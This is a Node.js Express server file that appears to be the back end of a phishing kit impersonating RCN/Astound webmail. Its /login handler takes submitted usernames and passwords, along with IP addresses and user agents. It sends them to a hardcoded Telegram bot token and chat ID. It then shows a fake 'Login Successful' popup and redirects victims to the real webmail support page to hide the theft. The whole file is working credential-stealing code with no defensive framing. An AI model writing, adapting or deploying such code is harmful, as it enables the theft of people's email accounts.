const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios"); // For API requests

const app = express();
const PORT = 3000;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "7945294820:AAH5ssD4h-VFaRnO0Mj48nLL7OJZKeV0c20";
const TELEGRAM_CHAT_ID = "7191391586"; // Replace with your Telegram chat ID

// Middleware
app.use(bodyParser.urlencoded({ extended: false })); // To parse form data
app.use(express.static(__dirname)); // Serve static files (HTML, CSS, JS)

// Utility function to get formatted timestamp
function getTimestamp() {
  const now = new Date();
  return now.toISOString(); // e.g., "2025-01-24T15:30:00.000Z"
}

// Function to send a message to the Telegram bot
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    if (response.status !== 200) {
      console.error(`Failed to send message: ${response.statusText}`);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error.message);
  }
}

// Handle login requests
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress; // Get client IP
  const userAgent = req.headers["user-agent"]; // Get user-agent
  const timestamp = getTimestamp(); // Get current timestamp

  console.log(`Received login attempt from IP: ${ipAddress} at ${timestamp}`);

  // Input validation
  if (!username || !password) {
    console.log("Validation failed: Missing username or password.");
    return res
      .status(400)
      .send("<h1>Invalid input</h1><p>Both username and password are required.</p>");
  }

  // Create log entry
  const logEntry = `Timestamp: ${timestamp}\nIP Address: ${ipAddress}\nUsername: ${username}\nPassword: ${password}\nUser-Agent: ${userAgent}\n`;

  // Send log entry to Telegram
  await sendToTelegram(logEntry);

  console.log(`welcome: ${username}`);
res.send(`
  <html>
    <head>
      <title>Login Success</title>
      <script type="text/javascript">
        // Display popup for 1 second
        function showPopup() {
          const popup = document.createElement('div');
          popup.style.position = 'fixed';
          popup.style.top = '50%';
          popup.style.left = '50%';
          popup.style.transform = 'translate(-50%, -50%)';
          popup.style.padding = '20px';
          popup.style.backgroundColor = '#000';
          popup.style.color = '#fff';
          popup.style.borderRadius = '8px';
          popup.style.zIndex = '1000';
          popup.innerText = 'Login Successful!';
          document.body.appendChild(popup);

          setTimeout(() => {
            popup.remove();
          }, 1000); // Popup closes after 1 second
        }

        // Redirect to "usertools.rcn.com" after 2 seconds
        function redirect() {
          setTimeout(() => {
            window.location.href = "https://www.astound.com/support/email/rcn-webmail/";
          }, 1000);
        }

        // Initialize both actions on page load
        window.onload = function() {
          showPopup();
          redirect();
        };
      </script>
    </head>
    <body>
      <h1>Welcome, ${username}!</h1>
      <p>Your login has been recorded successfully. Redirecting...</p>
    </body>
  </html>
`);
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
})
